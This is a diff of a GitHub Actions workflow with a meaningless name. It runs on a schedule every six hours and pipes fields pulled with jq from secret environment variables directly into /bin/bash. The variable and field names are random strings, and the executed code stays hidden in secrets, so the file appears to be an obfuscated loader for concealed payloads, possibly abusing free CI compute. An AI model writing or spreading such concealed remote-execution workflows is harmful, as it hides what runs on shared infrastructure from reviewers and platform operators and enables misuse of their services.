@@ -1,8 +1,10 @@
 name: yangtianbao2001
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '19 2/6 * * *'
+    - cron: '46 2/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -10,24 +12,9 @@ jobs:
       - uses: actions/checkout@v4
       - name: yangtianbao2001
         env:
-          pk9: ${{ secrets.pk9 }}
+          oazyp6135: ${{ secrets.oazyp6135 }}
         run: |
-          echo $pk9 | jq -r .mh418 | /bin/bash
-          echo $yijzh0 | jq -r .xvfru1287 | /bin/bash
-          echo $b69 | jq -r .am229 | /bin/bash
-          echo $ug01175 | jq -r .mivuf88800 | /bin/bash
-          echo $mklm520 | jq -r .thf2 | /bin/bash
-          echo $itfej65 | jq -r .po1 | /bin/bash
-          echo $xam9840 | jq -r .gymxo6 | /bin/bash
-          echo $vovjr9 | jq -r .guv74 | /bin/bash
-          echo $bq6398 | jq -r .wputc2 | /bin/bash
-          echo $n40 | jq -r .lmbv04 | /bin/bash
-          echo $ntyck984 | jq -r .nzq1188 | /bin/bash
-          echo $kl15766 | jq -r .e6 | /bin/bash
-          echo $yfc0 | jq -r .apdrg402 | /bin/bash
-          echo $ozc33903 | jq -r .cob289 | /bin/bash
-          echo $ui8083 | jq -r .efbv8 | /bin/bash
-          echo $oqv1128 | jq -r .uji491 | /bin/bash
-          echo $s99 | jq -r .qgf38 | /bin/bash
-          echo $ioob421 | jq -r .d14929 | /bin/bash
+          echo $oazyp6135 | jq -r .etqgx7547 | /bin/bash
+          echo $avfsa17 | jq -r .gr58218 | /bin/bash
+          echo $trjbo29 | jq -r .sfk20 | /bin/bash
 
